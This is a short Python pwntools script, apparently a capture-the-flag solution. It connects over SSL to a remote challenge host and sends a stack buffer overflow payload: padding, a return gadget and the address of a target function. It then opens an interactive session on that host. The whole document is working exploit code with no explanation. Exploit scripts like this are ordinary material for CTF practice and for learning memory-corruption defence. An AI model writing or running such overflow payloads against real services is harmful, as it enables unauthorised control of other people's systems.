from pwn import *

#io = process("./pwn1")
io = remote("279fa1c507eb932d99dcc634.tcp-ctf2.dasctf.com", 9999, ssl=True)

ret = 0x401016
fun = 0x401186

payload = b"a" * (0xf + 0x8) + p64(ret) + p64(fun)
io.sendline(payload)
io.interactive()
